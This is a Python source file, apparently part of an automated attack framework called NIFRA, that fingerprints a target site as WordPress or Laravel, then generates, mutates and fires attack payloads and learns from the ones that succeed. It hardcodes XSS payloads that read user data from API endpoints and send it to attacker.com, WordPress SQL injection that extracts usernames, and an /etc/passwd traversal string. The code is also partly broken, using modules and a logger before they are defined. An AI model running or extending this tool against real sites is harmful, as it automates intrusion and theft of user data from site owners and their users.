# agents/agent_controller.py
import asyncio
import json
import os
import logging
import sys
import threading
from datetime import datetime, timezone

# Tambahkan path ke Python path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import komponen-komponen dengan path yang benar
from agents.task_generator import generate_task_scenario
from agents.attack_agent import generate_attack
from agents.defense_agent import generate_defense
from agents.evaluator_agent import evaluate_result
from agents.prompt_memory import store_prompt
from agents.reasoner_agent import reason_task_objective
from analyzers.fingerprint_engine import AsyncFrameworkScanner
from trainer.strategy_updater import update_strategy
from trainer.memory_logger import save_to_buffer
from simulator.reward_engine import calculate_reward

# Import execute_attack dari simulator
from simulator.executor import execute_attack
from simulator.state_tracker import StateTracker

# Import Payload Optimizer (akan dibuat)
class PayloadOptimizer:
    def __init__(self, memory_file="trainer/memory_buffer.jsonl", evolution_rate=0.3):
        self.memory_file = memory_file
        self.evolution_rate = evolution_rate
        self.successful_payloads = []
        self.framework_specific_payloads = {}
        self.load_memory()
    
    def load_memory(self):
        """Load and analyze past payload effectiveness"""
        if not os.path.exists(self.memory_file):
            return
        
        with open(self.memory_file, 'r') as f:
            for line in f:
                try:
                    entry = json.loads(line)
                    # Extract key information
                    payload = entry.get('payload', '')
                    framework = entry.get('framework', 'unknown')
                    status = entry.get('status', 'failed')
                    evaluation = entry.get('evaluation', {})
                    score = evaluation.get('score', 0) if isinstance(evaluation, dict) else 0
                    bypassed = entry.get('bypassed', False)
                    
                    # Identify successful payloads
                    if status == 'success' or bypassed or score > 0.5 or (isinstance(evaluation, dict) and evaluation.get('status') == 'SUCCESS'):
                        payload_entry = {
                            'payload': payload,
                            'score': score,
                            'framework': framework,
                            'timestamp': entry.get('timestamp', datetime.now(timezone.utc).isoformat())
                        }
                        self.successful_payloads.append(payload_entry)
                        
                        # Organize by framework
                        if framework not in self.framework_specific_payloads:
                            self.framework_specific_payloads[framework] = []
                        self.framework_specific_payloads[framework].append(payload_entry)
                except Exception as e:
                    continue
    
    def get_optimized_payload(self, task, baseline_payload):
        """Generate optimized payload based on task and learning history"""
        framework = task.get('framework', 'unknown').lower() if isinstance(task, dict) else 'unknown'
        objective = task.get('objective', '').lower() if isinstance(task, dict) else ''
        
        # If no successful payloads, enhance baseline with some randomization
        if not self.successful_payloads:
            return self._enhance_baseline_payload(baseline_payload, framework, objective)
        
        # Try to use framework-specific successful payloads
        if framework in self.framework_specific_payloads and self.framework_specific_payloads[framework]:
            # Get top-scoring payload for this framework
            top_payloads = sorted(self.framework_specific_payloads[framework], 
                                 key=lambda x: x.get('score', 0), 
                                 reverse=True)
            
            if random.random() < self.evolution_rate:
                # Evolve: combine top payload with baseline or mutate
                return self._evolve_payload(top_payloads[0]['payload'], baseline_payload, framework, objective)
            else:
                # Use top payload with small modifications
                return self._modify_payload(top_payloads[0]['payload'], framework)
        
        # If no framework-specific payloads, use general successful payloads
        if self.successful_payloads:
            top_general = sorted(self.successful_payloads, 
                                key=lambda x: x.get('score', 0), 
                                reverse=True)[0]
            return self._modify_payload(top_general['payload'], framework)
        
        # Fallback to enhanced baseline
        return self._enhance_baseline_payload(baseline_payload, framework, objective)
    
    def _evolve_payload(self, successful_payload, baseline_payload, framework, objective):
        """Combine successful and baseline payloads or mutate successful payload"""
        # Extract useful parts from both payloads
        successful_parts = self._extract_payload_parts(successful_payload)
        baseline_parts = self._extract_payload_parts(baseline_payload)
        
        # Decide evolution strategy
        if random.random() < 0.5 and successful_parts and baseline_parts:
            # Combine parts from both payloads
            evolved_parts = []
            for i in range(max(len(successful_parts), len(baseline_parts))):
                if i < len(successful_parts) and random.random() < 0.7:
                    evolved_parts.append(successful_parts[i])
                elif i < len(baseline_parts):
                    evolved_parts.append(baseline_parts[i])
            
            evolved_payload = " ".join(evolved_parts)
        else:
            # Mutate successful payload
            evolved_payload = self._mutate_payload(successful_payload, framework, objective)
        
        return evolved_payload
    
    def _extract_payload_parts(self, payload):
        """Break payload into useful parts"""
        if not payload:
            return []
            
        # Split by common separators
        parts = re.split(r'[\n;\'"]', payload)
        # Filter out empty parts and trim
        return [p.strip() for p in parts if p.strip()]
    
    def _mutate_payload(self, payload, framework, objective):
        """Apply random mutations to a payload"""
        import random
        
        # Framework-specific mutations
        framework_enhancements = {
            'wordpress': [
                lambda p: p.replace('wp-json', 'wp-json/wp/v2'),
                lambda p: p.replace('.php', '.php?rest_route=/'),
                lambda p: p + '\n/* Start WordPress-specific mutation */'
            ],
            'laravel': [
                lambda p: p.replace('csrf', '_token'),
                lambda p: p.replace('api', 'api/v1'),
                lambda p: p + '\n/* Start Laravel-specific mutation */'
            ]
        }
        
        # Objective-specific mutations
        objective_enhancements = {
            'xss': [
                lambda p: p.replace('<script>', '<script>alert(1)</script>'),
                lambda p: p.replace('alert', 'prompt'),
                lambda p: p + '\n/* XSS enhancement */'
            ],
            'sql': [
                lambda p: p.replace('1=1', '1=1--'),
                lambda p: p.replace('union', 'UNION SELECT'),
                lambda p: p + '\n/* SQL injection enhancement */'
            ]
        }
        
        # Apply random mutations
        mutated = payload
        
        # Framework mutations
        if framework in framework_enhancements:
            mutation_func = random.choice(framework_enhancements[framework])
            mutated = mutation_func(mutated)
        
        # Objective mutations
        for obj_key, obj_mutations in objective_enhancements.items():
            if obj_key in objective:
                mutation_func = random.choice(obj_mutations)
                mutated = mutation_func(mutated)
        
        # Add random comment to make payload unique
        rand_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
        mutated += f'\n/* Mutation ID: {rand_id} */'
        
        return mutated
    
    def _modify_payload(self, payload, framework):
        """Make small modifications to a working payload"""
        import random
        
        # Just apply minor changes to keep core functionality
        modifications = [
            lambda p: p.replace('1.0', '1.1'),
            lambda p: p.replace('test', 'test1'),
            lambda p: p + '\n// Modified: ' + datetime.now(timezone.utc).isoformat(),
            lambda p: p.replace('function', 'function2'),
        ]
        
        modification_func = random.choice(modifications)
        return modification_func(payload)
    
    def _enhance_baseline_payload(self, baseline, framework, objective):
        """Enhance a baseline payload with framework and objective specific improvements"""
        import random
        
        if not baseline:
            return self._generate_default_payload(framework, objective)
        
        # Add framework-specific enhancements
        enhanced = baseline
        
        # Add framework hints
        if framework == 'wordpress':
            enhanced = enhanced.replace('uploads', 'wp-content/uploads')
            if 'wp-json' not in enhanced:
                enhanced += '\n\n// Adding WordPress API endpoints: /wp-json/wp/v2/'
        elif framework == 'laravel':
            if '_token' not in enhanced:
                enhanced += '\n\n// Laravel CSRF token field: _token'
        
        # Add objective-specific enhancements
        if 'xss' in objective.lower():
            if '<script>' not in enhanced:
                enhanced += '\n\n// Example XSS vectors: <script>alert(1)</script>, <img src=x onerror=alert(1)>'
        elif 'sql' in objective.lower():
            if 'union select' not in enhanced.lower():
                enhanced += '\n\n// SQL injection examples: \' OR 1=1--, UNION SELECT'
        
        # Add uniqueness for tracking
        rand_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
        enhanced += f'\n\n// Enhanced payload ID: {rand_id}'
        
        return enhanced
    
    def _generate_default_payload(self, framework, objective):
        """Generate a default payload if baseline is empty"""
        payloads = {
            'wordpress_xss': """<script>alert(document.cookie)</script>
<!-- WordPress XSS targeting wp-json endpoints -->
<img src=x onerror="fetch('/wp-json/wp/v2/users').then(r=>r.json()).then(d=>fetch('https://attacker.com/log?'+btoa(JSON.stringify(d))))">""",
            
            'wordpress_sql': """' OR 1=1--
/* WordPress SQL Injection targeting wp query vars */
%' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT user_login FROM wp_users WHERE ID=1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '%'='""",
            
            'laravel_xss': """<script>fetch('/api/user').then(r=>r.json()).then(d=>fetch('https://attacker.com/log?'+btoa(JSON.stringify(d))))</script>
<!-- Laravel XSS targeting Blade templates -->""",
            
            'laravel_sql': """' OR 1=1--
/* Laravel SQL Injection testing Eloquent escaping */
') OR 1=1--"""
        }
        
        framework = framework.lower() if framework else 'unknown'
        objective = objective.lower() if objective else ''
        
        # Try to find specific payload
        payload_key = f"{framework}_{objective}" if 'xss' in objective or 'sql' in objective else None
        
        if payload_key and payload_key in payloads:
            return payloads[payload_key]
        elif framework == 'wordpress' and payload_key and 'wordpress_' + objective in payloads:
            return payloads['wordpress_' + objective]
        elif 'xss' in objective:
            return payloads['wordpress_xss']  # Default to WordPress XSS
        elif 'sql' in objective:
            return payloads['wordpress_sql']  # Default to WordPress SQL
        else:
            # Generic payload
            return """<script>alert(1)</script>
' OR 1=1--
../../../etc/passwd
<!-- Generic payload for testing security -->"""

# Fungsi untuk retraining model
def retrain_model():
    """Check if model retraining is needed and start it if required"""
    logger.info("Checking if model retraining is needed...")
    
    # Placeholder - implementasi akan bergantung pada setup Anda
    memory_file = "trainer/memory_buffer.jsonl"
    min_entries = 10
    
    # Check if we have enough data
    if not os.path.exists(memory_file):
        logger.info("Memory file not found, skipping retraining")
        return False
        
    try:
        with open(memory_file, "r") as f:
            lines = list(f)
            if len(lines) < min_entries:
                logger.info(f"Not enough entries for retraining (have {len(lines)}, need {min_entries})")
                return False
                
        # Logic for retraining would go here
        logger.info("Would trigger model retraining here")
        
        # Example: record that retraining was attempted
        os.makedirs("trainer", exist_ok=True)
        with open("trainer/retraining_log.txt", "a") as f:
            f.write(f"{datetime.now(timezone.utc).isoformat()}: Retraining triggered with {len(lines)} entries\n")
            
        return True
    except Exception as e:
        logger.error(f"Error checking for retraining: {str(e)}")
        return False

# Setup logging
os.makedirs("logs", exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("logs/agent_controller.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('NIFRA-Controller')

# Import tambahan yang dibutuhkan
import random
import re
from urllib.parse import urlparse

# Database favicon dan threat untuk deteksi
favicon_db = {
    "9a3e4f123abcde0987f": "WordPress",
    "f4c3d1123defabcd456": "Laravel Nova",
    # Dapat ditambahkan lebih banyak
}

threat_db = {
    "badf00ddeadbeef0000": "Known Scam",
    "cafebabefeedface444": "Phishing Infra"
}

async def run_cycle(domain="web", url=None):
    """Siklus utama NIFRA: deteksi, serangan, evaluasi"""
    # Buat direktori yang diperlukan
    os.makedirs("sandbox", exist_ok=True)
    os.makedirs("trainer", exist_ok=True)
    os.makedirs("logs", exist_ok=True)
    os.makedirs("simulator", exist_ok=True)
    
    # Inisialisasi state tracker
    tracker = StateTracker()
    
    logger.info(f"Starting new NIFRA cycle for {url}")
    
    # Generate task berdasarkan domain
    task = generate_task_scenario(domain)
    
    # Tambahkan URL ke task
    if url:
        task["url"] = url
    
    # Jalankan fingerprinting terlebih dahulu jika URL disediakan
    fingerprint = {}
    if url:
        logger.info(f"Running framework detection on {url}")
        scanner = AsyncFrameworkScanner(favicon_db=favicon_db, threat_db=threat_db)
        scan_results = await scanner.scan_batch([url])
        if scan_results and len(scan_results) > 0:
            fingerprint = scan_results[0]
            if "framework" in fingerprint and fingerprint["framework"] != "unknown":
                task["framework"] = fingerprint["framework"]
                logger.info(f"Detected framework: {fingerprint['framework']} (confidence: {fingerprint.get('confidence', 'unknown')})")
                
                # Catat framework yang terdeteksi
                domain_name = urlparse(url).netloc
                if hasattr(tracker, 'record_framework'):
                    tracker.record_framework(domain_name, fingerprint["framework"], fingerprint.get("confidence", "low"))
    
    # Generate attack payload berdasarkan task
    logger.info(f"Generating attack payload for {task.get('framework', 'unknown framework')}")
    attack_payload = generate_attack(task)
    
    # Optimize payload berdasarkan pengalaman sebelumnya
    try:
        optimizer = PayloadOptimizer()
        optimized_payload = optimizer.get_optimized_payload(task, attack_payload)
        if optimized_payload and len(optimized_payload.strip()) > 10:
            logger.info("Using optimized payload from learning history")
            attack_payload = optimized_payload
    except Exception as e:
        logger.error(f"Error optimizing payload: {str(e)}")
    
    # Generate defense rule berdasarkan task
    defense_rule = generate_defense(task)
    
    # Generate reasoning berdasarkan task
    reasoning = reason_task_objective(task)
    
    # Load target config atau buat config default
    config_path = os.path.join("sandbox", "target_config.json")
    try:
        with open(config_path) as f:
            config = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        # Buat config default jika tidak ada
        config = {
            "url": url,
            "timeout": 10,
            "headers": {"User-Agent": "NIFRA Security Test"},
            "scan_limit": 5
        }
        with open(config_path, "w") as f:
            json.dump(config, f, indent=2)
    
    logger.info(f"Executing attack payload: {attack_payload[:50]}...")
    result = execute_attack(attack_payload, config)
    
    # Evaluasi hasil
    context = f"Task: {json.dumps(task)}\nPayload: {attack_payload}\nDefense: {defense_rule}\nReasoning: {reasoning}\nOutput: {result['output']}"
    logger.info("Evaluating results...")
    evaluation = evaluate_result(context)
    
    # Hitung reward berdasarkan evaluasi
    reward = calculate_reward(evaluation, verbose=True)
    logger.info(f"Reward for this cycle: {reward}")
    
    # Simpan ke memory buffer untuk pembelajaran
    save_to_buffer(task, attack_payload, result, evaluation, fingerprint)
    
    # Update strategi berdasarkan hasil
    try:
        strategy = update_strategy(evaluation.get("summary", ""), task, attack_payload)
    except:
        # Jika ada error, coba panggil dengan cara yang benar sesuai struktur fungsi
        strategy = update_strategy(str(evaluation), task, attack_payload)
    
    # Simpan prompt ke memory
    store_prompt(task, attack_payload, score=reward)
    
    # Catat hasil ke state tracker
    domain_name = urlparse(url).netloc
    
    tracker.record_injection(
        url=result.get("url", url),
        field=result.get("injected_field", "unknown"),
        payload=attack_payload,
        result=result
    )
    
    success = evaluation.get("status") == "SUCCESS"
    tracker.record_login(domain_name, success)
    
    # Try to retrain model in background
    try:
        threading.Thread(target=retrain_model, daemon=True).start()
        logger.info("Started background model retraining check")
    except Exception as e:
        logger.error(f"Error triggering model retraining: {str(e)}")
    
    return {
        "task": task,
        "payload": attack_payload,
        "defense": defense_rule,
        "reasoning": reasoning,
        "evaluation": evaluation,
        "injected_field": result.get("injected_field"),
        "framework": fingerprint.get("framework") if fingerprint else None,
        "confidence": fingerprint.get("confidence") if fingerprint else None,
        "reward": reward,
        "strategy": strategy
    }
